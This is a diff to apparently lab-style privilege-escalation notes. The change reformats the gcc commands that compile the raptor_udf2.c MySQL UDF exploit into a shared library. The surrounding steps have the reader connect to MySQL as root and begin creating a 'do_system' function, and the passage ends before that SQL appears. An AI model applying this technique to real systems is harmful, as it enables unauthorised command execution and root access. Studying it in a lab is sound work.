@@ -5,8 +5,10 @@
 - Change into the `/home/user/tools/mysql-udf` directory.
 `cd /home/user/tools/mysql-udf`
 - Compile the raptor_udf2.c exploit code using the following
-`gcc -g -c raptor_udf2.c -fPIC`
-`gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`
+```
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+```
 - Connect to the mysql service as the root user with a blank or known password.
 `mysql -u root`
 - Execute the following commands on the mysql shell to create a udf "do_system" using the compiled exploit
